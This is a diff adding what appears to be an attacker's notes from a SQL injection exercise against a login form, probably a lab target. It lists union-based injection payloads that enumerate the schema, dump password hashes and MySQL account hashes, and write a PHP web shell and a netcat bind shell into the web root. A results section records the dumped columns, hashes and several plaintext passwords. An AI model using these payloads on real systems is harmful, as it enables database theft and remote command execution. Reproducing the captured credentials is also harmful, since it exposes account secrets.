@@ -1,0 +1,84 @@
+SELECT * 
+  FROM users 
+ WHERE email=' {' or 1=1 union select tables from INFORMATION_SCHEMA#} ' 
+   AND pass='ffa6706ff2127a749973072756f83c532e43ed02' 
+   AND active IS NULL
+
+
+SELECT * 
+  FROM users 
+ WHERE email=' {' or 1=1 union select count(*), count(*), count(*), count(*) from users#} ' 
+   AND pass='ffa6706ff2127a749973072756f83c532e43ed02' 
+   AND active IS NULL
+
+
+
+' union select count(*), count(*), count(*), count(*), count(*), count(*), count(*), count(*)  from users#
+' union select 1,1,1,(select group_concat(table_name) from information_schema.tables where table_name='users'),pass,pass,pass,pass from users#
+' union select 1,1,1,database(),pass,pass,pass,pass from users#
+
+
+bla@isints.com' union select (select '<?php echo "hello!";//'),1,1,1,1,1,1,1 into outfile '/var/www/bla4.php' #
+
+' union select 1,1,1,(select group_concat(email) from users where pass = 'c2c4b4e51d9e23c02c15702c136c3e950ba9a4af'),pass,pass,pass,pass from users#
+' union select NULL,NULL,NULL,(select '<?php echo "helloo!!!";//' into outfile '/var/www/bla2.php'),NULL,NULL,NULL,NULL from users#
+
+
+' union select (select '<?php echo "<pre>";system("nc -nvl -p2212 -c /bin/bash");echo "</pre>";?>//'),1,1,1,1,1,1,1 into outfile '/var/www/rev2.php' #
+
+
+<?php
+	if(isset($_REQUEST['cmd'])){
+		echo "<pre>";
+		$cmd = ($_REQUEST['cmd']);
+		system($cmd);
+		echo "</pre>";
+		die;
+}
+?>
+
+
+
+
+
+
+=========ANSWERS==========
+Q: ' union select 1,1,1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'users'),pass,pass,pass,pass from users where email='admin@isints.com'# - waf detected
+A: user_id,first_name,last_name,email,pass,user_level,active,registration_date
+
+Q: ' union select 1,1,1,pass,pass,pass,pass,pass from users#
+A: c2c4b4e51d9e23c02c15702c136c3e950ba9a4af
+
+Q: ' union select 1,1,1,user_id,pass,pass,pass,pass from users#
+A: 1
+
+Q: ' union select 1,1,1,(select group_concat(table_name) from information_schema.tables),pass,pass,pass,pass from users#
+A: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVIL
+
+Q: bla@isints.com' union select 1,1,1,(select '<?php echo "hello!";//'), 1,1,1,1 into outfile '/var/www/bla2.php' #
+A: (surf to bla2.php) 1 1 1 hello!
+
+Q: ' union select (select '<?php echo "hello!";//'),1,1,1,1,1,1,1 into outfile '/var/www/bla4.php' #
+A: hello!
+
+upload shell!!
+Q: ' union select (select '<?php if(isset($_REQUEST[\'cmd\'])){echo "<pre>";$cmd = ($_REQUEST[\'cmd\']);system($cmd);echo "</pre>";die;}?>//'),1,1,1,1,1,1,1 into outfile '/var/www/test_shell.php' #
+A: surf to test_shell.php to get shell
+
+
+mysql users:
+Q: ' union select 1,1,1,(select group_concat(user) from mysql.user),pass,pass,pass,pass from users#
+A: root,debian-sys-maint,root,root
+Q: ' union select 1,1,1,(select group_concat(Password) from mysql.user),pass,pass,pass,pass from users#
+A: *248E4800AB95A1E412A83374AD8366B0C0780FFF,*248E4800AB95A1E412A83374AD8366B0C0780FFF,*248E4800AB95A1E412A83374AD8366B0C0780FFF,*9366FE2112E650C8E5523AE337B10A625C727943
+
+
+
+
+bla password = http://10.10.10.100/activate.php?x=bla%40gmail.com&y=c292e68e88cb9504f66ce9476432022f
+tomer password = tomer2000
+admin password = c2c4b4e51d9e23c02c15702c136c3e950ba9a4af
+user1 password = bla123 = 0e66460acd274e841bb6e701491dccc99cbdb3d9
+user2 password = bla123 = 0e66460acd274e841bb6e701491dccc99cbdb3d9
+
+
